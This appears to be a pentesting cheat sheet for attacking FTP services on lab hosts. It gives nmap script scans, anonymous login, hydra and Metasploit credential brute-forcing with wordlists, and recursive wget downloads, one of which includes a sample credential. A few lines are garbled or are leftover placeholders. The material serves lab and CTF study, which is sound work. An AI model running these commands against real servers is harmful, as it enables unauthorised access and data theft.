# Port 21 - FTP

### Connection

```bash
ftp 10.10.10.143
telnet 10.10.10.143 21
netcat 10.10.10.143 21
```

### Banner Grabbing

```bash
telnet -vn 10.10.10.143
```

### Anonymous Login

{% code overflow="wrap" %}
```bash
ftp 10.10.10.143
anonymous
anonymous
```
{% endcode %}

### nmap ftp Script

{% code overflow="wrap" %}
```bash
nmap -oA nmap/ftp.nmap -script 'not brute and not dos and *ftp*' --script-args= -d -Pn -v -p 21 10.10.10.143
nmap ftp vuln script
nmap --script=ftp-* -p 21 10.10.10.143ome code
```
{% endcode %}

### User Enumeration

```
// Some code
```

### Username and Password Bruteforce Attack

{% code overflow="wrap" %}
```bash
# hydra
hydra -L ../cred/users.txt -P ../cred/passwords.txt -e nsr -s 21 -o "172.16.1.12.ftp.txt" ftp://172.16.1.12

# Metasploit
use auxiliary/scanner/ftp/ftp_login
msf auxiliary(ftp_login) > show options
msf auxiliary(ftp_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf auxiliary(ftp_login) > set USER_FILE users.txt
msf auxiliary(ftp_login) > set RHOSTS 10.10.10.143
msf auxiliary(ftp_login) > run
```
{% endcode %}

### Download Files

```bash
ftp 10.10.10.143
PASSIVE
BINARY
get <FILE>
mget <FILEs>
```

### Download Files Recursively

{% code overflow="wrap" %}
```bash
wget -r ftp://username:password@10.10.10.143/dir/*
wget -r ftp://10.10.10.143/dir/* --ftp-user=username --ftp-password=password
wget -r --user=anonymous --password="" ftp://10.10.10.143/dir/*
wget -r --user="steph" --password="billabong" ftp://10.1.1.68/
```
{% endcode %}

### Sort files based on file size

{% code overflow="wrap" %}
```bash
find . -type f -exec du -h {} + | sort -h
```
{% endcode %}

### &#x20;Read all files

{% code overflow="wrap" %}
```bash
for file in $(find . -type f); do echo ">> $file <<"; cat $file; done
```
{% endcode %}
